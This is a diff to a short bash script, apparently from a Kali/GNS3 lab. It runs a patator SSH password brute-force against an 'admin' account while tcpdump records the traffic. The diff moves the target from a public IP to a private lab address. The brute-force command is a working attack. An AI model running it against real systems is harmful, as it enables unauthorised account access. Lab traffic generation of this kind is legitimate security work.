@@ -1,6 +1,6 @@
 #!/bin/bash
 
-TARGET="205.174.165.68"
+TARGET="192.168.10.3"
 INTERFACE="eth0"
 USER="admin"
 BRUTE_FOLDER="/home/kali/GNS3/BruteForce"
@@ -13,7 +13,7 @@ if [[ ! -f "$WORDLIST" ]]; then
 fi
 
 echo "Starting tcpdump..."
-sudo tcpdump -i "$INTERFACE" dst "$TARGET" and port 22 -w "$PCAP_FILE" &
+sudo tcpdump -i "$INTERFACE" host "$TARGET" -w "$PCAP_FILE" &
 TCPDUMP_PID=$!
 
 patator ssh_login host="$TARGET" user="$USER" password=FILE0 0="$WORDLIST" -t 5
